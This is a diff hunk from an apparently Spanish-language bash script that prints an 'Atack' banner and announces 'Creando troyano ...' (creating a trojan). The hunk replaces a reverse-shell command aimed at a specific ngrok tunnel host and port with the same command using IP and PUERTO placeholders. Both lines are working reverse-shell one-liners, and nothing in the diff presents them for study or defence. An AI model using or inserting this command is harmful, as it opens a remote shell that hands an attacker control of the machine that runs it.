@@ -38,7 +38,7 @@ clear
 #! /bin/bash
 setterm -foreground green
 figlet Atack
-bash -i  >& /dev/tcp/2.tcp.ngrok.io/14677 0>&1 &
+bash -i  >& /dev/tcp/IP/PUERTO 0>&1 &
 setterm -foreground red
 echo "Creando troyano ..."
 sleep 1
